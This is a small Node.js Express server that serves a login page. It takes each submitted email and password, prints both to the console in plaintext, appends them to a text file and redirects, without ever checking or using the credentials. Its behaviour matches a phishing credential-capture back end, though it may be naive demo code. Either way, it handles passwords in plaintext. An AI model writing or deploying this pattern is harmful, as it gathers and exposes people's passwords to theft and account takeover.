const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login-form.html'));
  });

app.post('/submit-form', (req, res) => {
  const { email, password } = req.body;
  console.log('Email:', email);
  console.log('Password:', password);

  
  const data = `${email}, ${password}\n`
  fs.appendFile('login-data.txt', data, (err) => {
    if (err) {
      console.error(err)
      res.status(500).send('Failed to write to file')
    } else {
      console.log('New data has been recorded')
      res.redirect('/submitted')
    }
  })
});

app.get('/submitted', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'message.html'))
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});